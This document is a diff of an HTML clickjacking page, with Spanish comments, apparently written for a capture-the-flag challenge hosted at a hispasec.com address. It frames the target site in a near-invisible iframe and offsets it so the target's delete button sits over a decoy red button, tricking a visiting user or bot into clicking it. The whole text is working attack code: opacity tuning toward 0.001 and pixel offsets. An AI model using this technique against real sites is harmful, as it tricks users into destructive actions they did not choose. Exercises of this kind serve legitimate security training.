@@ -2,57 +2,45 @@
 <html>
 <head>
     <style>
-        body { margin: 0; padding: 0; background: white; }
-        
-        #victim-container {
+        body { margin: 0; padding: 0; overflow: hidden; }
+
+        #wrapper {
             position: relative;
             width: 1000px;
-            height: 1200px;
-            margin: 0 auto;
+            height: 800px;
+            overflow: hidden; /* Cortamos la vista */
         }
 
         iframe {
-            width: 100%;
-            height: 100%;
-            border: none;
             position: absolute;
-            top: 0;
-            left: 0;
-            z-index: 1;
-            /* Opacidad muy baja pero NO cero */
-            opacity: 0.05; 
+            width: 1000px;
+            height: 2000px; /* Muy alto */
+            border: none;
+            z-index: 2;
+            opacity: 0.5; /* AJUSTA Y LUEGO PON EN 0.001 */
+            
+            /* --- EL TRUCO DEL SCROLL --- */
+            /* Movemos el iframe hacia ARRIBA para que el botón de borrar
+               quede justo en la esquina superior izquierda (0,0) */
+            top: -780px; 
+            left: -20px;
         }
 
         #objetivo {
             position: absolute;
-            z-index: 2;
-            /* Posición más probable para el botón de borrar */
-            top: 820px; 
-            left: 50px;
-            
-            width: 200px;
-            height: 60px;
-            
-            /* IMPORTANTE: Color casi invisible pero NO transparente */
-            background-color: rgba(255, 0, 0, 0.01);
-            border: 1px solid rgba(0, 0, 0, 0.01);
-            cursor: pointer;
-            outline: none;
+            top: 0;
+            left: 0;
+            width: 300px;  /* Ahora es un botón en la esquina superior */
+            height: 100px;
+            z-index: 1;    /* Debajo del iframe */
+            background: red;
         }
     </style>
 </head>
 <body>
-    <div id="victim-container">
-        <button id="objetivo" type="button"></button>
-        
+    <div id="wrapper">
+        <button id="objetivo"></button>
         <iframe src="https://ctf.fap.hispasec.com:8018/books/1"></iframe>
     </div>
-
-    <script>
-        // TRUCO EXTRA: Forzar el foco en el botón para que el bot lo vea rápido
-        window.onload = function() {
-            document.getElementById('objetivo').focus();
-        };
-    </script>
 </body>
 </html>
